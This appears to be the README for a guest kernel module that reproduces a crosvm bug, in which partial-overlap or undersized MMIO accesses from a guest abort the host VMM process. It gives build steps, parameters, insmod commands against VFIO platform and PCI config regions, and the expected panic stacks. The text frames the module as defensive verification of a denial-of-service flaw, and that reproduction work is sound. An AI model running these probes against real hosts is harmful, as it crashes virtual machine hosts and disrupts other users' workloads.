# Guest module: crosvm Bus partial-overlap / panic DoS reproducer

**Purpose:** Defensive VMM verification. Show that a guest can deliver
`(addr, len)` pairs into crosvm `Bus::read` / `Bus::write` where `addr` is
inside a device registration but `addr + len` extends past it — and, when a
**VFIO platform** device is present, actually **abort the crosvm host** via
the known `region_read` / `region_write` panic.

This is **NOT** an escape payload, RCE chain, or memory-corruption exploit.
Impact of the primary finding is **host panic DoS** only.

Checkout cited: `/workspace/crosvm` @ `da53811`.

## Build

On an **x86_64 Linux guest** (or cross-build against that guest's headers):

```bash
cd guest-module
make
# Or: make KERNELDIR=/path/to/linux-headers modules
```

Produces `bus_partial_overlap.ko`. Requires `CONFIG_X86_64`.

## Module parameters

| Param | Default | Meaning |
|-------|---------|---------|
| `target=` | `cmos` | `cmos` \| `vfio` \| `pci_vcfg` \| `mmio` \| `all` |
| `vfio_base=` | 0 | Guest-physical base of a **VFIO platform** MMIO region |
| `vfio_len=` | 0 | Region size in bytes |
| `vfio_end=` | 0 | Optional exclusive end GPA; if set with `vfio_base`, derives `vfio_len` |
| `vfio_do_write=` | true | Also try `writeq` (region_write panics too) |
| `pci_vcfg_base=` | 0 | GPA of `PciVirtualConfigMmio` (ACPI `VCFG`) |
| `mmio_base=` | 0 | Optional generic/virtio-mmio base (no panic expected) |

## Kill crosvm via VFIO platform (PRIMARY)

### Prerequisites

1. Host crosvm started with a **platform** VFIO device, e.g.:
   ```bash
   crosvm run --vfio-platform /sys/bus/platform/devices/<dev> ...
   # or legacy: --vfio-platform /path/to/vfio/group device
   ```
2. **Not** plain PCI VFIO (`--vfio` / VFIO-PCI). PCI BARs go through
   `find_bar_and_offset` full-containment (`pci_device.rs:557-620`) and
   **will not** hit the `region_*` panic on this overlap shape.
3. Prefer a **fresh VM** / first access: `VfioPlatformDevice` lazily
   `regions_mmap()` after the first trap; once stage-2 mapped, later
   in-bounds hits may not exit to the VMM. The spanning access must be
   the (or an early) trap that still takes `read_mmio` → `region_read`.

### Find the guest GPA

- **crosvm logs** (debug): look for platform MMIO allocation /
  `vfio_mmio` / region insert addresses from `allocate_regions`.
- **Guest DT / ACPI** (aarch64 DT symbol; on x86 resources vary): sysfs
  under the bound platform/vfio driver (`resource*`, `maps`).
- Region length must match what crosvm registered (same as VFIO region
  size from `allocate_regions`).

### Run inside guest

```bash
# PRIMARY — expect HOST crosvm to abort on first readq
sudo insmod ./bus_partial_overlap.ko target=vfio \
  vfio_base=0x<gpa> vfio_len=0x<region_size>

# Or with exclusive end:
sudo insmod ./bus_partial_overlap.ko target=vfio \
  vfio_base=0x<gpa> vfio_end=0x<gpa+len>
```

What the module does:

1. `readq` at `vfio_base + vfio_len - 4` (8-byte access; start in-region if
   `len >= 4`, end past region) — **primary panic shot**
2. `readl` at `vfio_base + vfio_len - 2` — alternate span
3. `writeq` at `vfio_base + vfio_len - 4` if `vfio_do_write=1`

**Success:** crosvm process aborts; guest may hang/reset. Guest dmesg may
not show a return from `readq`.

**Failure (host still up):** wrong GPA, PCI VFIO instead of platform, region
already mmap'd, or bug fixed. Module logs a warning if the access returns.

### Expected host stack (bug present)

```text
Bus::get_device          // start-only, devices/src/bus.rs ~433-441
  → VfioPlatformDevice::read   // vfio_platform.rs:68-70
  → read_mmio → find_region    // :160-170 start-only; :334-338
  → VfioDevice::region_read    // vfio.rs:1818-1828
       panic!("tried to read VFIO region with invalid arguments: ...")
```

Write path: `write` → `write_mmio` → `region_write` (`vfio.rs:1855-1868`).

## Secondary: PciVirtualConfigMmio undersized read

**Guest-reachable on normal x86_64 crosvm.** Registered at
`get_pcie_vcfg_mmio_range()` — typically
`start = max(round_up_2MB(ram_end), 4GiB)` (`x86_64/src/lib.rs:1989-1996`),
inserted at `:1145-1152`. ACPI AML Name **`VCFG`** holds the start.

```bash
# Find VCFG (example: parse ACPI / DSDT for Name (VCFG, ...))
# Often 0x100000000 (4GiB) when guest RAM < 4GiB.
sudo insmod ./bus_partial_overlap.ko target=pci_vcfg \
  pci_vcfg_base=0x100000000
```

Issues `readb` then `readw`. Host: logs `unexpected read ... len = 1`, then
panics on `data[0..4].copy_from_slice` (`pci_root.rs:920-936`). Write path
does **not** panic (early return).

## Safe PIO probes (no host panic)

```bash
sudo insmod ./bus_partial_overlap.ko target=cmos
# or default: sudo insmod ./bus_partial_overlap.ko
dmesg | tail -40
sudo rmmod bus_partial_overlap
```

CMOS / PIC / i8042 reject or ignore `len != 1`. Useful to prove the bus
footgun is guest-reachable without killing the VMM.

## All probes

```bash
sudo insmod ./bus_partial_overlap.ko target=all \
  vfio_base=0x... vfio_len=0x... \
  pci_vcfg_base=0x... \
  mmio_base=0x...   # optional
```

Order: CMOS/PIC/i8042 → VFIO (may kill host) → pci_vcfg → generic mmio.
If VFIO panics, later probes never run.

## Honest limitations

| Claim | Reality |
|-------|---------|
| Guest can hit Bus partial-overlap | **Yes** (even CMOS PIO alone) |
| Host panic via VFIO **platform** end-span | **Yes**, if device present + GPA correct + still on trap path |
| Host panic via VFIO **PCI** BAR end-span | **No** — BAR full-containment mitigates |
| Without `--vfio-platform` | VFIO shots fault/no-op in guest; host lives |
| Memory corruption / RCE | **Not claimed** — panics before OOB copy |
| pci_vcfg undersize | Guest-reachable; separate panic (wrong-size, not classic overlap) |

## Observe on host

```bash
RUST_LOG=devices=debug,warn ./crosvm run --vfio-platform ...
# On success: process abort; panic message about VFIO region invalid args
# On CMOS-only: "PIC: Bad read size: 4" etc., process continues
```

See parent **`PANIC_REPRO.md`** for exact stacks and citations.
